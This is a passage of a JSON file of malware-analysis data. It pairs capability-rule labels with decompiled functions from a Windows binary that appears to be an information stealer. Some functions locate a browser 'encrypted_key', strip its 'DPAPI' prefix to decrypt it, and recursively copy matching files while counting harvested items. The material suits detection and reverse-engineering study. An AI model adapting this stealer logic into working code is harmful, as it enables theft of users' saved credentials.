fcn.00420948();\n    return;\n}\n",
        "token_count": 961
    },
    "0040c3cb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid __cdecl\nfcn.0040c3cb(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h, uint arg_ch, uint arg_10h, uint noname_12, uint noname_13, \n            uint arg_40h, uint noname_15, uint arg_48h_2, uint noname_17, uint noname_18, uint noname_19, uint noname_20\n            , uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint arg_48h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_25ch_2;\n    uint var_258h_2;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_25ch;\n    uint var_258h;\n    uint var_230h;\n    uint var_214h;\n    uint var_1f8h;\n    uint var_1dch_2;\n    uint var_1c0h;\n    uint var_1dch;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a4h;\n    uint var_188h;\n    uint var_16ch;\n    uint var_150h;\n    uint var_134h_2;\n    uint var_118h;\n    uint var_134h;\n    uint var_124h;\n    uint var_120h;\n    uint in_stack_ffffffdc;\n    uint var_4h_2;\n    \n    fcn.004208fe();\n    *(unaff_EBP + -600) = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x120) = 0xf;\n    *(unaff_EBP + -0x124) = 0;\n    *(unaff_EBP + -0x134) = 0;\n    *(unaff_EBP + -4) = 3;\n    if (*(unaff_EBP + 0xc) == 0) {\n        var_4h_2 = 0x1a;\n    }\n    else {\n        var_4h_2 = 0x1c;\n    }\n    fcn.00416c79(var_4h_2);\n    fcn.00403f50();\n    fcn.0040c183(unaff_EBP + -0x1dc, unaff_EBP + -0x134);\n    *(unaff_EBP + -4) = 4;\n    *(unaff_EBP + -0x25c) = &stack0xffffffdc;\n    fcn.0040d747(&stack0xffffffdc, unaff_EBP + 0x48);\n    fcn.00416a28(in_stack_ffffffdc);\n    *(unaff_EBP + -4) = 6;\n    fcn.00403f73(1, 0);\n    *(unaff_EBP + -0x25c) = *(unaff_EBP + -0x268);\n    *(unaff_EBP + -0x254) = *(unaff_EBP + -0x26c);\n    if (*(unaff_EBP + -0x26c) != *(unaff_EBP + -0x268)) {\n        do {\n            fcn.0040d466(*(unaff_EBP + -0x254));\n            *(unaff_EBP + -4) = 7;\n            fcn.004167f9(unaff_EBP + -0x230);\n            *(unaff_EBP + -4) = 8;\n            fcn.0040c183(unaff_EBP + -0x214, unaff_EBP + -0x134);\n            *(unaff_EBP + -4) = 9;\n            fcn.004042ed();\n            *(unaff_EBP + -4) = 10;\n            *(unaff_EBP + -0x1ac) = 0xf;\n            *(unaff_EBP + -0x1b0) = 0;\n            *(unaff_EBP + -0x1c0) = 0;\n            fcn.00403f0c();\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            *(unaff_EBP + -4) = 0xe;\n            fcn.00403f73(1, 0);\n            fcn.004167f9(unaff_EBP + -0x150);\n            *(unaff_EBP + -4) = 0xf;\n            fcn.0040c183(unaff_EBP + -0x1a4, unaff_EBP + -0x134);\n            *(unaff_EBP + -4) = 0x10;\n            fcn.004042ed();\n            *(unaff_EBP + -4) = 0x11;\n            puVar2 = fcn.00416865(unaff_EBP + -0x1f8);\n            if (7 < puVar2[5]) {\n                puVar2 = *puVar2;\n            }\n            uVar3 = (**0x4462f0)(puVar2);\n            if ((uVar3 == 0xffffffff) || (*(unaff_EBP + -0x250) = 1,  (uVar3 & 0x10) != 0)) {\n                *(unaff_EBP + -0x250) = 0;\n            }\n            fcn.0040c0f0(1);\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            *(unaff_EBP + -4) = 0xe;\n            fcn.00403f73(1, 0);\n            if (*(unaff_EBP + -0x250) != 0) {\n                piVar1 = *(unaff_EBP + -600) + 0x1c;\n                *piVar1 = *piVar1 + 1;\n            }\n            fcn.004257d0(unaff_EBP + -0x118, 0, 0x104);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1c4);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1c8);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1a8);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1a8);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1a4);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1cc);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43e1d0);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n            iVar5 = *(unaff_EBP + 0x2c);\n            if (*(unaff_EBP + 0x40) < 0x10) {\n                iVar5 = unaff_EBP + 0x2c;\n            }\n            (**0x4464ac)(unaff_EBP + -0x118, iVar5);\n            (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n            puVar2 = fcn.004167f9(unaff_EBP + -0x150);\n            *(unaff_EBP + -4) = 0x12;\n            if (0xf < puVar2[5]) {\n                puVar2 = *puVar2;\n            }\n            (**0x4464ac)(unaff_EBP + -0x118, puVar2);\n            *(unaff_EBP + -4) = 0xe;\n            fcn.00403f73();\n            uVar4 = fcn.004167f9(unaff_EBP + -0x188);\n            *(unaff_EBP + -0x250) = uVar4;\n            *(unaff_EBP + -4) = 0x13;\n            fcn.0040c183(unaff_EBP + -0x1a4, unaff_EBP + -0x134);\n            *(unaff_EBP + -4) = 0x14;\n            puVar2 = fcn.004042ed();\n            *(unaff_EBP + -4) = 0x15;\n            if (0xf < puVar2[5]) {\n                puVar2 = *puVar2;\n            }\n            fcn.00416b05(puVar2);\n            iVar5 = fcn.00427460();\n            fcn.00403f73();\n            fcn.00403f73();\n            *(unaff_EBP + -4) = 0xe;\n            fcn.00403f73();\n            *0x44627c = *0x44627c + iVar5;\n            *0x446268 = *0x446268 + 1;\n            uVar4 = fcn.004167f9(unaff_EBP + -0x188);\n            *(unaff_EBP + -0x250) = uVar4;\n            *(unaff_EBP + -4) = 0x16;\n            fcn.0040c183(unaff_EBP + -0x1a4, unaff_EBP + -0x134);\n            *(unaff_EBP + -4) = 0x17;\n            fcn.004042ed();\n            *(unaff_EBP + -4) = 0x18;\n            fcn.0041d4dc();\n            fcn.00403f73();\n            fcn.00403f73();\n            fcn.00403f73();\n            fcn.00403f73(1);\n            *(unaff_EBP + -4) = 6;\n            fcn.0040c0f0(1);\n            *(unaff_EBP + -0x254) = *(unaff_EBP + -0x254) + 0x1c;\n        } while (*(unaff_EBP + -0x254) != *(unaff_EBP + -0x25c));\n    }\n    if (*(unaff_EBP + -0x26c) != 0) {\n        fcn.0040d5fa(*(unaff_EBP + -0x268));\n        fcn.0041e801(*(unaff_EBP + -0x26c));\n    }\n    *(unaff_EBP + -0x26c) = 0;\n    *(unaff_EBP + -0x268) = 0;\n    *(unaff_EBP + -0x264) = 0;\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 2638
    },
    "0040e1fe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e1fe(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.0041dbc3(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.0041dbeb();\n    return ~-(iVar1 != 0) & param_1;\n}\n",
        "token_count": 133
    },
    "0040e62c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.0040e62c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t *unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = 0;\n    var_4h = (**0x446340)(arg_8h, 0x80000000, 1, 0, 3, 0, 0);\n    if ((var_4h != 0) && (var_4h != -1)) {\n        iVar2 = (**0x4462f8)(var_4h, &var_10h);\n        if ((iVar2 != 0) && (var_ch == 0)) {\n            *unaff_ESI = var_10h;\n            iVar2 = (**0x446454)(0x40, var_10h);\n            *unaff_EBX = iVar2;\n            if (iVar2 != 0) {\n                uVar1 = (**0x446468)(var_4h, iVar2, *unaff_ESI, &var_8h, 0);\n                uVar1 = uVar1 & *unaff_ESI == var_8h;\n                if (uVar1 == 0) {\n                    (**0x446554)(*unaff_EBX);\n                }\n            }\n        }\n        (**0x446344)(var_4h);\n    }\n    return uVar1;\n}\n",
        "token_count": 356
    },
    "0040e80b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e80b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint extraout_ECX;\n    uchar *puVar5;\n    int32_t unaff_EBP;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208fe(0x38);\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x40) = extraout_ECX;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 0xc);\n    iVar3 = fcn.0040e62c(*(unaff_EBP + 8));\n    if (((iVar3 != 0) && (*(unaff_EBP + -0x34) != 0)) && (iVar3 = *(unaff_EBP + -0x30),  iVar3 != 0)) {\n        puVar4 = (**0x446454)(0x40, iVar3 + 1);\n        if (puVar4 != NULL) {\n            if (iVar3 != 0) {\n                iVar1 = *(unaff_EBP + -0x34);\n                puVar5 = puVar4;\n                do {\n                    *puVar5 = puVar5[iVar1 - puVar4];\n                    puVar5 = puVar5 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            iVar3 = (**0x44632c)(puVar4, \"encrypted_key\");\n            if (iVar3 != 0) {\n                *(unaff_EBP + -0x18) = 0xf;\n                *(unaff_EBP + -0x1c) = 0;\n                *(unaff_EBP + -0x2c) = 0;\n                fcn.00403f50(iVar3 + 0x10);\n                *(unaff_EBP + -4) = 0;\n                iVar3 = fcn.0040bfb7();\n                if (iVar3 != -1) {\n                    fcn.0040415d();\n                }\n                iVar3 = *(unaff_EBP + -0x2c);\n                if (*(unaff_EBP + -0x18) < 0x10) {\n                    iVar3 = unaff_EBP + -0x2c;\n                }\n                iVar3 = fcn.0040e6b5(iVar3);\n                if (iVar3 != 0) {\n                    iVar3 = 5;\n                    if (4 < *(unaff_EBP + -0x3c)) {\n                        bVar8 = true;\n                        pcVar6 = *(unaff_EBP + -0x30);\n                        pcVar7 = \"DPAPI\";\n                        do {\n                            if (iVar3 == 0) break;\n                            iVar3 = iVar3 + -1;\n                            bVar8 = *pcVar6 == *pcVar7;\n                            pcVar6 = pcVar6 + 1;\n                            pcVar7 = pcVar7 + 1;\n                        } while (bVar8);\n                        if (bVar8) {\n                            cVar2 = fcn.0040e70e(*(unaff_EBP + -0x3c) - 5, unaff_EBP + -0x34);\n                            if ((cVar2 != '\\0') && (*(unaff_EBP + -0x30) == 0x20)) {\n                                *(unaff_EBP + -0x38) = 1;\n                                fcn.0040e7a1(*(unaff_EBP + -0x34));\n                            }\n                        }\n                    }\n                }\n                fcn.00403f73(1);\n            }\n        }\n    }\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 940
    },
    "004107b2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid __cdecl\nfcn.004107b2(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t unaff_EBP;\n    uint var_4h;\n    uint var_5ach_2;\n    uint var_4f8h_2;\n    uint var_4f4h_2;\n    uint var_4f0h_2;\n    uint var_4ech_2;\n    uint var_4e8h_2;\n    uint var_4e4h_2;\n    uint var_4e0h_2;\n    uint var_4dch;\n    uint var_4c0h;\n    uint var_4a4h;\n    uint var_5ach;\n    uint var_488h_2;\n    uint var_478h_2;\n    uint var_46ch_2;\n    uint var_45ch_2;\n    uint var_450h_2;\n    uint var_440h_2;\n    uint var_43ch_2;\n    uint var_434h_2;\n    uint var_544h;\n    uint var_424h_2;\n    uint var_420h_2;\n    uint var_418h_2;\n    uint var_408h_2;\n    uint var_404h_2;\n    uint var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_488h;\n    uint var_478h;\n    uint var_474h;\n    uint var_46ch;\n    uint var_45ch;\n    uint var_458h;\n    uint var_450h;\n    uint var_440h;\n    uint var_43ch;\n    uint var_434h;\n    uint var_424h;\n    uint var_420h;\n    uint var_418h;\n    uint var_408h;\n    uint var_404h;\n    uint var_3fch;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint var_4h_2;\n    \n    fcn.004208fe();\n    *(unaff_EBP + -0x4e0) = *(unaff_EBP + 8);\n    fcn.004257d0();\n    fcn.00416c79(0x28);\n    (**0x4464ac)();\n    (**0x4464ac)();\n    uVar2 = (**0x4463fc)();\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        fcn.004144aa(unaff_EBP + -0x5ac, unaff_EBP + -0x3fc);\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x404) = 0xf;\n        *(unaff_EBP + -0x408) = 0;\n        *(unaff_EBP + -0x418) = 0;\n        *(unaff_EBP + -0x474) = 0xf;\n        *(unaff_EBP + -0x478) = 0;\n        *(unaff_EBP + -0x488) = 0;\n        *(unaff_EBP + -0x458) = 0xf;\n        *(unaff_EBP + -0x45c) = 0;\n        *(unaff_EBP + -0x46c) = 0;\n        *(unaff_EBP + -0x43c) = 0xf;\n        *(unaff_EBP + -0x440) = 0;\n        *(unaff_EBP + -0x450) = 0;\n        *(unaff_EBP + -0x420) = 0xf;\n        *(unaff_EBP + -0x424) = 0;\n        *(unaff_EBP + -0x434) = 0;\n        *(unaff_EBP + -4) = 5;\n        uVar2 = fcn.004150da(unaff_EBP + -0x5ac + *(*(unaff_EBP + -0x5ac) + 4), 10);\n        piVar3 = fcn.00415493(unaff_EBP + -0x5ac, uVar2 & 0xff);\n        uVar2 = *(*piVar3 + 4) + piVar3;\n        for (uVar2 = uVar2 & ~-((*(uVar2 + 0xc) & 6) != 0); uVar2 != 0; uVar2 = uVar2 & ~-((*(uVar2 + 0xc) & 6) != 0)) {\n            iVar4 = fcn.0040bfb7();\n            if (iVar4 != -1) {\n                fcn.0040415d();\n                fcn.004140d2();\n                fcn.00404029(unaff_EBP + -0x418, 0, 0xffffffff);\n            }\n            iVar4 = fcn.0040bfb7();\n            if (iVar4 != -1) {\n                fcn.0040415d();\n                fcn.004140d2();\n                fcn.00404029(unaff_EBP + -0x418, 0, 0xffffffff);\n            }\n            iVar4 = fcn.0040bfb7();\n            if (iVar4 != -1) {\n                fcn.0040415d();\n                fcn.004140d2();\n                fcn.00404029(unaff_EBP + -0x418, 0, 0xffffffff);\n            }\n            iVar4 = fcn.0040bfb7();\n            *(unaff_EBP + -0x4e4) = iVar4;\n            if (iVar4 != -1) {\n                fcn.0040415d();\n                fcn.004140d2();\n                iVar4 = unaff_EBP + -0x418;\n                *(unaff_EBP + -0x4ec) = &stack0xffffff60;\n                fcn.00404397();\n                fcn.00416447(iVar4, in_stack_ffffff60, in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, \n                             in_stack_ffffff70);\n                *(unaff_EBP + -4) = 6;\n                fcn.00403f0c();\n                *(unaff_EBP + -4) = 5;\n                fcn.00403f73(1, 0);\n            }\n            iVar4 = fcn.0040c0a1(0x43bd76, 0);\n            if ((((iVar4 != 0) && (iVar4 = fcn.0040c0a1(0x43bd76, 0),  iVar4 != 0)) &&\n                (iVar4 = fcn.0040c0a1(0x43bd76, 0),  iVar4 != 0)) && (iVar4 = fcn.0040c0a1(0x43bd76, 0),  iVar4 != 0)) {\n                (**0x4464ac)(*(unaff_EBP + -0x4e0), *0x4461c0);\n                (**0x4464ac)(*(unaff_EBP + -0x4e0), *0x446178);\n                fcn.0040c1db(unaff_EBP + -0x4a4, 0x43dfc0);\n                *(unaff_EBP + -4) = 7;\n                puVar5 = fcn.0040d747(unaff_EBP + -0x4c0, unaff_EBP + -0x46c);\n                *(unaff_EBP + -4) = 8;\n                if (0xf < puVar5[5]) {\n                    puVar5 = *puVar5;\n                }\n                uVar1 = *(unaff_EBP + -0x4e0);\n                (**0x4464ac)(uVar1, puVar5);\n                fcn.00403f73(1, 0);\n                *(unaff_EBP + -4) = 5;\n                fcn.00403f73(1, 0);\n                (**0x4464ac)(uVar1, 0x43bd78);\n                (**0x4464ac)(uVar1, *0x445c5c);\n                iVar4 = *(unaff_EBP + -0x450);\n                if (*(unaff_EBP + -0x43c) < 0x10) {\n                    iVar4 = unaff_EBP + -0x450;\n                }\n                (**0x4464ac)(uVar1, iVar4);\n                (**0x4464ac)(uVar1, 0x43bd78);\n                (**0x4464ac)(uVar1, *0x446138);\n                iVar4 = *(unaff_EBP + -0x434);\n                if (*(unaff_EBP + -0x420) < 0x10) {\n                    iVar4 = unaff_EBP + -0x434;\n                }\n                (**0x4464ac)(uVar1, iVar4);\n                (**0x4464ac)(uVar1, 0x43e104);\n                fcn.00403fb5();\n                fcn.00403fb5();\n                fcn.00403fb5();\n                fcn.00403fb5();\n                *0x4462b4 = *0x4462b4 + 1;\n            }\n            uVar2 = fcn.004150da(unaff_EBP + -0x5ac + *(*(unaff_EBP + -0x5ac) + 4), 10);\n            piVar3 = fcn.00415493(unaff_EBP + -0x5ac, uVar2 & 0xff);\n            uVar2 = *(*piVar3 + 4) + piVar3;\n        }\n        fcn.00403f73();\n        fcn.00403f73();\n        fcn.00403f73();\n        fcn.00403f73();\n        fcn.00403f73();\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00414544();\n        *(unaff_EBP + -0x544) = vtable.std::ios_base.0;\n        fcn.0041d7cf(unaff_EBP + -0x544);\n    }\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 2845
    },
    "00411242": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411242(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_ESI;\n    uint var_960h;\n    uint var_95ch;\n    uint var_958h;\n    uint var_954h;\n    uint var_928h;\n    uint var_814h;\n    uint var_42ch;\n    uint var_324h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    (**0x446300)(&var_42ch, \"%s\\\\*\", arg_ch);\n    iVar1 = (**0x44656c)(&var_42ch, &var_954h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x4464dc)(&var_928h, 0x43df80);\n            if ((iVar2 != 0) && (iVar2 = (**0x4464dc)(&var_928h, 0x43df84),  iVar2 != 0)) {\n                (**0x446300)(&var_324h, \"%s\\\\%s\", arg_ch, &var_928h);\n                iVar2 = (**0x4464dc)(arg_8h, 0x43bd76);\n                if (iVar2 == 0) {\n                    (**0x446300)(&var_21ch, 0x43dfbc);\n                }\n                else {\n                    (**0x446300)(&var_21ch, \"%s\\\\%s\", arg_8h, &var_928h);\n                }\n                iVar2 = (**0x4463a8)(&var_928h, arg_10h);\n                if (iVar2 != 0) {\n                    fcn.004257d0(&var_814h, 0, 1000);\n                    (**0x4464ac)(&var_814h, *0x445d08);\n                    (**0x4464ac)(&var_814h, &var_21ch);\n                    fcn.004257d0(&var_114h, 0, 0x104);\n                    (**0x4464ac)(&var_114h, *0x446038);\n                    uVar3 = fcn.00416673();\n                    (**0x4464ac)(&var_114h, uVar3);\n                    (**0x446354)(&var_324h, &var_114h, 1);\n                    fcn.0041d4dc(&var_814h, 0, 2);\n                    (**0x4463b0)(&var_114h);\n                }\n                fcn.00411242(&var_21ch, &var_324h, arg_10h);\n            }\n            iVar2 = (**0x4463c4)(iVar1, &var_954h);\n        } while (iVar2 != 0);\n        (**0x446334)(iVar1);\n    }\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 707
    },
    "00411ed7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411ed7(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_ECX;\n    uint unaff_ESI;\n    ulong uVar4;\n    uint var_580h;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_53ch;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    (**0x446300)(&var_428h, \"%s\\\\*\", arg_ch);\n    iVar1 = (**0x44656c)(&var_428h, &var_568h);\n    if (iVar1 != -1) {\n        do {\n            *(arg_8h + 0x1c) = *(arg_8h + 0x1c) + 1;\n            iVar2 = (**0x4464dc)(&var_53ch, 0x43df80);\n            if ((iVar2 != 0) && (iVar2 = (**0x4464dc)(&var_53ch, 0x43df84),  iVar2 != 0)) {\n                fcn.004257d0(&var_320h, 0, 0x104);\n                fcn.004257d0(&var_110h, 0, 0x104);\n                (**0x4464ac)(&var_320h, arg_ch);\n                (**0x4464ac)(&var_320h, 0x43bd7c);\n                (**0x4464ac)(&var_320h, &var_53ch);\n                (**0x4464ac)(&var_110h, 0x43bd7c);\n                uVar3 = *0x4461dc;\n                if (arg_18h != 0) {\n                    uVar3 = *0x445b24;\n                }\n                (**0x4464ac)(&var_110h, uVar3);\n                (**0x4464ac)(&var_110h, 0x43bd7c);\n                (**0x4464ac)(&var_110h, in_ECX);\n                (**0x4464ac)(&var_110h, 0x43bd7c);\n                (**0x4464ac)(&var_110h, arg_10h);\n                (**0x4464ac)(&var_110h, 0x43bd7c);\n                (**0x4464ac)(&var_110h, arg_14h);\n                if (arg_1ch == 1) {\n                    (**0x4464ac)(&var_110h, 0x43bd7c);\n                    uVar3 = *0x446028;\ncode_r0x004120cd:\n                    (**0x4464ac)(&var_110h, uVar3);\n                }\n                else {\n                    if (arg_1ch == 2) {\n                        (**0x4464ac)(&var_110h, 0x43bd7c);\n                        uVar3 = *0x445e94;\n                        goto code_r0x004120cd;\n                    }\n                    if (arg_1ch == 3) {\n                        (**0x4464ac)(&var_110h, 0x43bd7c);\n                        uVar3 = *0x445b60;\n                        goto code_r0x004120cd;\n                    }\n                }\n                (**0x4464ac)(&var_110h, 0x43bd7c);\n                (**0x4464ac)(&var_110h, &var_53ch);\n                fcn.004257d0(&var_218h, 0, 0x104);\n                (**0x4464ac)(&var_218h, *0x446038);\n                uVar3 = fcn.00416673();\n                (**0x4464ac)(&var_218h, uVar3);\n                (**0x446354)(&var_320h, &var_218h, 1);\n                uVar4 = fcn.00416b05(&var_218h);\n                iVar2 = fcn.00427460(uVar4, 1000, 0);\n                *0x44627c = *0x44627c + iVar2;\n                iVar2 = (**0x4464dc)(in_ECX, *0x4461f8);\n                if (iVar2 == 0) {\n                    *0x446268 = *0x446268 + 1;\n                }\n                iVar2 = (**0x4464dc)(in_ECX, *0x446208);\n                if (iVar2 == 0) {\n                    *0x446268 = *0x446268 + 1;\n                }\n                fcn.0041d4dc(&var_110h, 0, 2);\n                (**0x4463b0)(&var_218h);\n            }\n            iVar2 = (**0x4463c4)(iVar1, &var_568h);\n        } while (iVar2 != 0);\n        (**0x446334)(iVar1);\n    }\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 1245
    },
    "00412ee7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412ee7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_23ch;\n    uint var_22ch;\n    uint var_228h;\n    uint var_220h;\n    uint var_118h;\n    uint var_4h;\n    \n    fcn.004208fe(0x268);\n    *(unaff_EBP + -0x270) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x264) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x26c) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x260) = 0;\n    *(unaff_EBP + -0x25c) = 0;\n    fcn.004257d0(unaff_EBP + -0x220, 0, 0x104);\n    uVar2 = fcn.00416c79(0x1c);\n    (**0x4464ac)(unaff_EBP + -0x220, uVar2);\n    (**0x4464ac)(unaff_EBP + -0x220, extraout_ECX);\n    fcn.004257d0(unaff_EBP + -0x118, 0, 0x104);\n    (**0x4464ac)(unaff_EBP + -0x118, unaff_EBP + -0x220);\n    (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n    (**0x4464ac)(unaff_EBP + -0x118, *0x445d10);\n    pcVar3 = unaff_EBP + -0x118;\n    *(unaff_EBP + -0x228) = 0xf;\n    *(unaff_EBP + -0x22c) = 0;\n    *(unaff_EBP + -0x23c) = 0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403fb5(unaff_EBP + -0x118, pcVar3 - (unaff_EBP + -0x117));\n    *(unaff_EBP + -4) = 0;\n    puVar4 = fcn.00416865(unaff_EBP + -600);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    uVar5 = (**0x4462f0)(puVar4);\n    if ((uVar5 == 0xffffffff) || (*(unaff_EBP + -0x268) = 1,  (uVar5 & 0x10) != 0)) {\n        *(unaff_EBP + -0x268) = 0;\n    }\n    fcn.0040c0f0(1);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00403f73(1, 0);\n    if (*(unaff_EBP + -0x268) != 0) {\n        iVar6 = fcn.0040e80b(unaff_EBP + -0x118, unaff_EBP + -0x25c);\n        if (iVar6 == 0) {\n            fcn.0040e771();\n        }\n    }\n    iVar6 = *(unaff_EBP + -0x270);\n    fcn.004102de(0x43bd76, unaff_EBP + -0x220, *(unaff_EBP + -0x264), *(unaff_EBP + -0x260), *(unaff_EBP + -0x25c), \n                 *(iVar6 + 0x20), *(unaff_EBP + -0x26c));\n    if (*(iVar6 + 6) != '\\0') {\n        fcn.004126ff(iVar6, unaff_EBP + -0x220, *(unaff_EBP + -0x264));\n    }\n    fcn.0040e771();\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1053
    },
    "004130dd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
